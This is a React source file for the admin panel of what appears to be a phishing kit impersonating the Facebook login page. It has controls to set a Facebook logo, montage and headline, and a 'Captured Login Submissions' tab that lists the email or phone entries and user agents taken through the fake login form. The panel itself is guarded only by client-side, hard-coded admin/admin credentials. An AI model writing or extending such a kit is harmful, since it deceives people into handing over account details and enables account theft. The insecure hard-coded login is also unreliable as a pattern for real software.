import React, { useState, useEffect } from 'react';
import {
  ShieldCheck,
  Image as ImageIcon,
  Check,
  AlertTriangle,
  ArrowLeft,
  RotateCcw,
  ExternalLink,
  Users,
  Trash2,
  Lock,
  Database,
  Sparkles,
  Save,
  CheckCircle2
} from 'lucide-react';
import { SiteSettings, LoginSubmission } from '../types';
import { updateSiteSettings, getSubmissions, deleteSubmission } from '../firebase';
import { FacebookLogo } from './FacebookLogo';

interface AdminPanelProps {
  settings: SiteSettings;
  onUpdateSettings: (newSettings: SiteSettings) => void;
  onNavigateHome: () => void;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({
  settings,
  onUpdateSettings,
  onNavigateHome
}) => {
  // Authentication state
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return sessionStorage.getItem('fb_admin_auth') === 'true';
  });
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState('');

  // Editing state
  const [logoUrl, setLogoUrl] = useState(settings.logoUrl || '');
  const [pageImageUrl, setPageImageUrl] = useState(settings.pageImageUrl || '');
  const [headlineLine1, setHeadlineLine1] = useState(settings.headlineLine1 || 'Explore');
  const [headlineLine2, setHeadlineLine2] = useState(settings.headlineLine2 || 'the things');
  const [headlineHighlight, setHeadlineHighlight] = useState(settings.headlineHighlight || 'you love.');

  // Tabs: 'branding' | 'submissions'
  const [activeTab, setActiveTab] = useState<'branding' | 'submissions'>('branding');

  // Submissions list
  const [submissions, setSubmissions] = useState<LoginSubmission[]>([]);
  const [loadingSubmissions, setLoadingSubmissions] = useState(false);

  // Status feedback
  const [isSaving, setIsSaving] = useState(false);
  const [saveSuccess, setSaveSuccess] = useState(false);
  const [logoPreviewError, setLogoPreviewError] = useState(false);
  const [pageImgPreviewError, setPageImgPreviewError] = useState(false);

  // Sync state if external settings change
  useEffect(() => {
    setLogoUrl(settings.logoUrl || '');
    setPageImageUrl(settings.pageImageUrl || '');
    setHeadlineLine1(settings.headlineLine1 || 'Explore');
    setHeadlineLine2(settings.headlineLine2 || 'the things');
    setHeadlineHighlight(settings.headlineHighlight || 'you love.');
  }, [settings]);

  // Load submissions
  useEffect(() => {
    if (isAuthenticated && activeTab === 'submissions') {
      loadSubmissions();
    }
  }, [isAuthenticated, activeTab]);

  const loadSubmissions = async () => {
    setLoadingSubmissions(true);
    try {
      const data = await getSubmissions();
      setSubmissions(data);
    } catch (err) {
      console.error(err);
    } finally {
      setLoadingSubmissions(false);
    }
  };

  const handleAdminLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username.trim() === 'admin' && password.trim() === 'admin') {
      setIsAuthenticated(true);
      sessionStorage.setItem('fb_admin_auth', 'true');
      setLoginError('');
    } else {
      setLoginError('Invalid credentials. Required: username "admin", password "admin"');
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    sessionStorage.removeItem('fb_admin_auth');
  };

  const handleSave = async () => {
    setIsSaving(true);
    setSaveSuccess(false);

    const updated: SiteSettings = {
      ...settings,
      logoUrl: logoUrl.trim(),
      pageImageUrl: pageImageUrl.trim(),
      headlineLine1: headlineLine1.trim(),
      headlineLine2: headlineLine2.trim(),
      headlineHighlight: headlineHighlight.trim(),
      updatedAt: new Date().toISOString(),
      updatedBy: 'admin'
    };

    try {
      await updateSiteSettings(updated);
      onUpdateSettings(updated);
      setSaveSuccess(true);
      setTimeout(() => setSaveSuccess(false), 3500);
    } catch (err) {
      console.error('Failed to save settings:', err);
      alert('Error updating Firebase Firestore: ' + (err instanceof Error ? err.message : String(err)));
    } finally {
      setIsSaving(false);
    }
  };

  const handleDeleteSubmission = async (id: string) => {
    await deleteSubmission(id);
    setSubmissions((prev) => prev.filter((s) => s.id !== id));
  };

  // If user is not yet logged in with admin/admin
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white rounded-2xl shadow-xl border border-gray-100 p-8">
          <div className="flex flex-col items-center mb-6">
            <div className="w-14 h-14 rounded-2xl bg-[#0866FF]/10 text-[#0866FF] flex items-center justify-center mb-3">
              <ShieldCheck className="w-8 h-8" />
            </div>
            <h1 className="text-2xl font-bold text-gray-900">Admin Authentication</h1>
            <p className="text-sm text-gray-500 mt-1 text-center">
              Enter your admin credentials to customize the Facebook page
            </p>
          </div>

          {loginError && (
            <div className="mb-4 p-3 bg-red-50 border border-red-200 text-red-700 text-xs rounded-xl flex items-center gap-2">
              <AlertTriangle className="w-4 h-4 shrink-0" />
              <span>{loginError}</span>
            </div>
          )}

          <form onSubmit={handleAdminLogin} className="space-y-4">
            <div>
              <label className="block text-xs font-semibold text-gray-700 uppercase tracking-wider mb-1.5">
                Username
              </label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="admin"
                className="w-full px-4 py-3 rounded-xl border border-gray-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#0866FF] focus:border-transparent"
                required
                autoFocus
              />
            </div>

            <div>
              <label className="block text-xs font-semibold text-gray-700 uppercase tracking-wider mb-1.5">
                Password
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="admin"
                className="w-full px-4 py-3 rounded-xl border border-gray-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#0866FF] focus:border-transparent"
                required
              />
            </div>

            <div className="p-3 bg-blue-50/70 border border-blue-100 rounded-xl text-xs text-blue-800">
              <span className="font-semibold">Notice:</span> Default credentials are{' '}
              <code className="bg-white px-1.5 py-0.5 rounded text-[#0866FF] font-mono">admin</code> /{' '}
              <code className="bg-white px-1.5 py-0.5 rounded text-[#0866FF] font-mono">admin</code>
            </div>

            <button
              type="submit"
              className="w-full py-3 bg-[#0866FF] hover:bg-[#0064e0] text-white font-semibold rounded-xl text-sm transition-colors cursor-pointer shadow-sm"
            >
              Log In to Admin Panel
            </button>
          </form>

          <div className="mt-6 pt-4 border-t border-gray-100 text-center">
            <button
              type="button"
              onClick={onNavigateHome}
              className="text-xs text-gray-500 hover:text-gray-800 inline-flex items-center gap-1.5 cursor-pointer"
            >
              <ArrowLeft className="w-3.5 h-3.5" />
              <span>Back to Facebook Login Page</span>
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col font-sans">
      {/* Top Navbar */}
      <header className="bg-white border-b border-gray-200 sticky top-0 z-40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <FacebookLogo customLogoUrl={logoUrl} size={36} />
            <div>
              <div className="flex items-center gap-2">
                <span className="font-bold text-gray-900 text-base">Facebook Admin Panel</span>
                <span className="bg-emerald-50 text-emerald-700 border border-emerald-200 text-[10px] font-semibold px-2 py-0.5 rounded-full inline-flex items-center gap-1 font-mono">
                  <Database className="w-2.5 h-2.5" />
                  <span>facebook-90dbd</span>
                </span>
              </div>
              <p className="text-xs text-gray-500">Live customization for Logo and Page Image</p>
            </div>
          </div>

          <div className="flex items-center gap-2.5">
            <button
              type="button"
              onClick={onNavigateHome}
              className="px-3.5 py-1.5 rounded-lg border border-gray-300 text-gray-700 hover:bg-gray-50 text-xs font-medium inline-flex items-center gap-1.5 transition-colors cursor-pointer"
            >
              <ExternalLink className="w-3.5 h-3.5" />
              <span>View Login Page</span>
            </button>
            <button
              type="button"
              onClick={handleLogout}
              className="px-3.5 py-1.5 rounded-lg bg-gray-100 hover:bg-red-50 hover:text-red-600 text-gray-700 text-xs font-medium transition-colors cursor-pointer"
            >
              Log out
            </button>
          </div>
        </div>
      </header>

      {/* Main Container */}
      <div className="flex-1 max-w-6xl w-full mx-auto px-4 sm:px-6 py-8">
        {/* Navigation Tabs */}
        <div className="flex items-center gap-2 mb-6 border-b border-gray-200 pb-3">
          <button
            type="button"
            onClick={() => setActiveTab('branding')}
            className={`px-4 py-2 rounded-xl text-sm font-semibold transition-colors cursor-pointer inline-flex items-center gap-2 ${
              activeTab === 'branding'
                ? 'bg-[#0866FF] text-white shadow-xs'
                : 'text-gray-600 hover:bg-gray-100'
            }`}
          >
            <ImageIcon className="w-4 h-4" />
            <span>Image & Branding Settings</span>
          </button>

          <button
            type="button"
            onClick={() => setActiveTab('submissions')}
            className={`px-4 py-2 rounded-xl text-sm font-semibold transition-colors cursor-pointer inline-flex items-center gap-2 ${
              activeTab === 'submissions'
                ? 'bg-[#0866FF] text-white shadow-xs'
                : 'text-gray-600 hover:bg-gray-100'
            }`}
          >
            <Users className="w-4 h-4" />
            <span>Login Submissions ({submissions.length})</span>
          </button>
        </div>

        {/* Tab 1: Branding and Image Customization */}
        {activeTab === 'branding' && (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Left Form: Settings Inputs */}
            <div className="lg:col-span-7 space-y-6">
              {/* Logo Setting Card */}
              <div className="bg-white rounded-2xl border border-gray-200 p-6 shadow-xs">
                <div className="flex items-start justify-between mb-4">
                  <div>
                    <h2 className="text-base font-bold text-gray-900 flex items-center gap-2">
                      <span>Header Logo</span>
                      <span className="text-[11px] font-normal text-gray-500 bg-gray-100 px-2 py-0.5 rounded-md">
                        URL upload
                      </span>
                    </h2>
                    <p className="text-xs text-gray-500 mt-1">
                      Direct image link/address for the Facebook logo shown on desktop and mobile.
                    </p>
                  </div>
                  {logoUrl && (
                    <button
                      type="button"
                      onClick={() => {
                        setLogoUrl('');
                        setLogoPreviewError(false);
                      }}
                      className="text-xs text-red-600 hover:underline inline-flex items-center gap-1 cursor-pointer"
                    >
                      <RotateCcw className="w-3 h-3" />
                      <span>Reset to Facebook Icon</span>
                    </button>
                  )}
                </div>

                <div className="space-y-3">
                  <div>
                    <label className="block text-xs font-medium text-gray-700 mb-1">
                      Logo Image Address / Link (URL)
                    </label>
                    <input
                      type="url"
                      value={logoUrl}
                      onChange={(e) => {
                        setLogoUrl(e.target.value);
                        setLogoPreviewError(false);
                      }}
                      placeholder="https://example.com/my-custom-logo.png"
                      className="w-full px-3.5 py-2.5 rounded-xl border border-gray-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#0866FF] font-mono text-xs"
                    />
                  </div>

                  {/* Quick Preset Buttons */}
                  <div className="flex flex-wrap items-center gap-1.5 text-xs">
                    <span className="text-gray-400 text-[11px] mr-1">Presets:</span>
                    <button
                      type="button"
                      onClick={() => {
                        setLogoUrl('');
                        setLogoPreviewError(false);
                      }}
                      className="px-2.5 py-1 bg-gray-100 hover:bg-gray-200 text-gray-700 rounded-md transition-colors cursor-pointer text-xs"
                    >
                      Default Official SVG
                    </button>
                    <button
                      type="button"
                      onClick={() => {
                        setLogoUrl('https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png');
                        setLogoPreviewError(false);
                      }}
                      className="px-2.5 py-1 bg-blue-50 hover:bg-blue-100 text-blue-700 rounded-md transition-colors cursor-pointer text-xs"
                    >
                      Classic Blue Badge
                    </button>
                  </div>
                </div>
              </div>

              {/* Page Image Setting Card */}
              <div className="bg-white rounded-2xl border border-gray-200 p-6 shadow-xs">
                <div className="flex items-start justify-between mb-4">
                  <div>
                    <h2 className="text-base font-bold text-gray-900 flex items-center gap-2">
                      <span>Desktop Page Image</span>
                      <span className="text-[11px] font-normal text-gray-500 bg-gray-100 px-2 py-0.5 rounded-md">
                        URL upload
                      </span>
                    </h2>
                    <p className="text-xs text-gray-500 mt-1">
                      Direct image link/address for the hero creative illustration on the left column.
                    </p>
                  </div>
                  {pageImageUrl && (
                    <button
                      type="button"
                      onClick={() => {
                        setPageImageUrl('');
                        setPageImgPreviewError(false);
                      }}
                      className="text-xs text-red-600 hover:underline inline-flex items-center gap-1 cursor-pointer"
                    >
                      <RotateCcw className="w-3 h-3" />
                      <span>Reset to Facebook Montage</span>
                    </button>
                  )}
                </div>

                <div className="space-y-3">
                  <div>
                    <label className="block text-xs font-medium text-gray-700 mb-1">
                      Page Image Address / Link (URL)
                    </label>
                    <input
                      type="url"
                      value={pageImageUrl}
                      onChange={(e) => {
                        setPageImageUrl(e.target.value);
                        setPageImgPreviewError(false);
                      }}
                      placeholder="https://example.com/banner-or-friends-photo.jpg"
                      className="w-full px-3.5 py-2.5 rounded-xl border border-gray-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#0866FF] font-mono text-xs"
                    />
                  </div>

                  {/* Quick Preset Buttons */}
                  <div className="flex flex-wrap items-center gap-1.5 text-xs">
                    <span className="text-gray-400 text-[11px] mr-1">Presets:</span>
                    <button
                      type="button"
                      onClick={() => {
                        setPageImageUrl('');
                        setPageImgPreviewError(false);
                      }}
                      className="px-2.5 py-1 bg-gray-100 hover:bg-gray-200 text-gray-700 rounded-md transition-colors cursor-pointer text-xs"
                    >
                      Exact Facebook Montage
                    </button>
                    <button
                      type="button"
                      onClick={() => {
                        setPageImageUrl('https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&w=800&q=80');
                        setPageImgPreviewError(false);
                      }}
                      className="px-2.5 py-1 bg-blue-50 hover:bg-blue-100 text-blue-700 rounded-md transition-colors cursor-pointer text-xs"
                    >
                      Friends Collab
                    </button>
                    <button
                      type="button"
                      onClick={() => {
                        setPageImageUrl('https://images.unsplash.com/photo-1511632765486-a01980e01a18?auto=format&fit=crop&w=800&q=80');
                        setPageImgPreviewError(false);
                      }}
                      className="px-2.5 py-1 bg-blue-50 hover:bg-blue-100 text-blue-700 rounded-md transition-colors cursor-pointer text-xs"
                    >
                      Community Celebration
                    </button>
                  </div>
                </div>
              </div>

              {/* Tagline / Headline Text Customization */}
              <div className="bg-white rounded-2xl border border-gray-200 p-6 shadow-xs">
                <h2 className="text-base font-bold text-gray-900 mb-1">Page Headline</h2>
                <p className="text-xs text-gray-500 mb-4">
                  Customize the bold text next to the login box.
                </p>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                  <div>
                    <label className="block text-xs font-medium text-gray-600 mb-1">Line 1</label>
                    <input
                      type="text"
                      value={headlineLine1}
                      onChange={(e) => setHeadlineLine1(e.target.value)}
                      className="w-full px-3 py-2 rounded-xl border border-gray-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#0866FF]"
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-600 mb-1">Line 2</label>
                    <input
                      type="text"
                      value={headlineLine2}
                      onChange={(e) => setHeadlineLine2(e.target.value)}
                      className="w-full px-3 py-2 rounded-xl border border-gray-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#0866FF]"
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-[#0866FF] mb-1">Highlight (Blue)</label>
                    <input
                      type="text"
                      value={headlineHighlight}
                      onChange={(e) => setHeadlineHighlight(e.target.value)}
                      className="w-full px-3 py-2 rounded-xl border border-blue-300 text-sm focus:outline-none focus:ring-2 focus:ring-[#0866FF]"
                    />
                  </div>
                </div>
              </div>

              {/* Save Button & Feedback */}
              <div className="flex items-center gap-4 pt-2">
                <button
                  type="button"
                  onClick={handleSave}
                  disabled={isSaving}
                  className="px-6 py-3.5 bg-[#0866FF] hover:bg-[#0064e0] text-white font-bold rounded-xl text-sm flex items-center gap-2 shadow-md transition-all cursor-pointer disabled:opacity-70"
                >
                  <Save className="w-4 h-4" />
                  <span>{isSaving ? 'Saving to Firebase...' : 'Save & Publish to Firebase'}</span>
                </button>

                {saveSuccess && (
                  <div className="flex items-center gap-1.5 text-xs text-emerald-600 font-semibold bg-emerald-50 border border-emerald-200 px-3 py-2 rounded-xl">
                    <CheckCircle2 className="w-4 h-4" />
                    <span>Saved successfully! Changes are live on the login page.</span>
                  </div>
                )}
              </div>
            </div>

            {/* Right Column: Live Previews */}
            <div className="lg:col-span-5 space-y-6">
              {/* Logo Preview Box */}
              <div className="bg-white rounded-2xl border border-gray-200 p-5 shadow-xs">
                <div className="text-xs font-semibold uppercase tracking-wider text-gray-400 mb-3">
                  Live Logo Preview
                </div>
                <div className="flex items-center gap-4 p-4 bg-gray-50 rounded-xl border border-gray-100">
                  <div className="w-16 h-16 rounded-full bg-white flex items-center justify-center shadow-xs overflow-hidden border border-gray-200">
                    {logoUrl ? (
                      logoPreviewError ? (
                        <AlertTriangle className="w-6 h-6 text-amber-500" />
                      ) : (
                        <img
                          src={logoUrl}
                          alt="Logo Preview"
                          onError={() => setLogoPreviewError(true)}
                          className="w-full h-full object-contain"
                        />
                      )
                    ) : (
                      <FacebookLogo size={44} />
                    )}
                  </div>
                  <div className="flex-1">
                    <div className="text-sm font-semibold text-gray-900">
                      {logoUrl ? 'Custom Image' : 'Default Facebook Logo'}
                    </div>
                    <div className="text-xs text-gray-500 truncate max-w-[200px]">
                      {logoUrl || 'Official SVG icon rendered'}
                    </div>
                    {logoPreviewError && (
                      <div className="text-[11px] text-amber-600 mt-1">
                        Image failed to load. Check that the URL is public and ends with an image format (.png, .jpg, etc).
                      </div>
                    )}
                  </div>
                </div>
              </div>

              {/* Page Image Preview Box */}
              <div className="bg-white rounded-2xl border border-gray-200 p-5 shadow-xs">
                <div className="text-xs font-semibold uppercase tracking-wider text-gray-400 mb-3">
                  Live Page Image Preview
                </div>
                <div className="p-4 bg-gray-50 rounded-xl border border-gray-100">
                  {pageImageUrl ? (
                    pageImgPreviewError ? (
                      <div className="p-6 text-center text-xs text-amber-600 bg-amber-50 rounded-lg">
                        <AlertTriangle className="w-6 h-6 mx-auto mb-2 text-amber-500" />
                        Page image failed to load. Please verify the URL.
                      </div>
                    ) : (
                      <div className="rounded-lg overflow-hidden border border-gray-200 max-h-[220px]">
                        <img
                          src={pageImageUrl}
                          alt="Page image preview"
                          onError={() => setPageImgPreviewError(true)}
                          className="w-full h-auto object-cover max-h-[220px]"
                        />
                      </div>
                    )
                  ) : (
                    <div className="p-6 text-center text-xs text-gray-500 bg-white rounded-lg border border-dashed border-gray-200">
                      <Sparkles className="w-5 h-5 mx-auto mb-2 text-[#0866FF]" />
                      Default Facebook Multi-Card Montage is active (with smiling friends, DJ, cooler, and 3D reaction emojis).
                    </div>
                  )}

                  <div className="mt-3 text-xs text-gray-500">
                    <span className="font-semibold text-gray-700">Display location:</span> Desktop hero column (left side of login form).
                  </div>
                </div>
              </div>

              {/* Headline Preview Box */}
              <div className="bg-white rounded-2xl border border-gray-200 p-5 shadow-xs">
                <div className="text-xs font-semibold uppercase tracking-wider text-gray-400 mb-2">
                  Live Headline Preview
                </div>
                <div className="p-4 bg-gray-50 rounded-xl border border-gray-100">
                  <h3 className="text-2xl font-bold tracking-tight text-[#1c1e21] leading-tight">
                    {headlineLine1 || 'Explore'}<br />
                    {headlineLine2 || 'the things'}{' '}
                    <span className="text-[#0866FF]">
                      {headlineHighlight || 'you love.'}
                    </span>
                  </h3>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Tab 2: Login Submissions Viewer */}
        {activeTab === 'submissions' && (
          <div className="bg-white rounded-2xl border border-gray-200 p-6 shadow-xs">
            <div className="flex items-center justify-between mb-4">
              <div>
                <h2 className="text-base font-bold text-gray-900">Captured Login Submissions</h2>
                <p className="text-xs text-gray-500 mt-1">
                  View attempts submitted through the Facebook login form. Synced with Firestore & local cache.
                </p>
              </div>
              <button
                type="button"
                onClick={loadSubmissions}
                disabled={loadingSubmissions}
                className="px-3.5 py-1.5 rounded-lg border border-gray-300 text-gray-700 hover:bg-gray-50 text-xs font-medium inline-flex items-center gap-1.5 cursor-pointer"
              >
                <RotateCcw className={`w-3.5 h-3.5 ${loadingSubmissions ? 'animate-spin' : ''}`} />
                <span>Refresh</span>
              </button>
            </div>

            {loadingSubmissions ? (
              <div className="py-12 text-center text-sm text-gray-400">Loading submissions...</div>
            ) : submissions.length === 0 ? (
              <div className="py-12 text-center text-sm text-gray-400">
                No submissions logged yet. Try submitting the login form on the main page.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs border-collapse">
                  <thead>
                    <tr className="border-b border-gray-200 text-gray-500 bg-gray-50">
                      <th className="py-2.5 px-3 font-semibold">Submitted At</th>
                      <th className="py-2.5 px-3 font-semibold">Email / Mobile Number</th>
                      <th className="py-2.5 px-3 font-semibold">User Agent / Device</th>
                      <th className="py-2.5 px-3 font-semibold text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100">
                    {submissions.map((sub) => (
                      <tr key={sub.id} className="hover:bg-gray-50/60 transition-colors">
                        <td className="py-3 px-3 text-gray-600 whitespace-nowrap">
                          {new Date(sub.submittedAt).toLocaleString()}
                        </td>
                        <td className="py-3 px-3 font-mono font-medium text-gray-900">
                          {sub.identifier}
                        </td>
                        <td className="py-3 px-3 text-gray-500 max-w-xs truncate" title={sub.userAgent}>
                          {sub.userAgent || 'Unknown'}
                        </td>
                        <td className="py-3 px-3 text-right">
                          <button
                            type="button"
                            onClick={() => handleDeleteSubmission(sub.id)}
                            className="p-1.5 text-gray-400 hover:text-red-600 rounded-lg hover:bg-red-50 transition-colors cursor-pointer"
                            title="Delete entry"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};
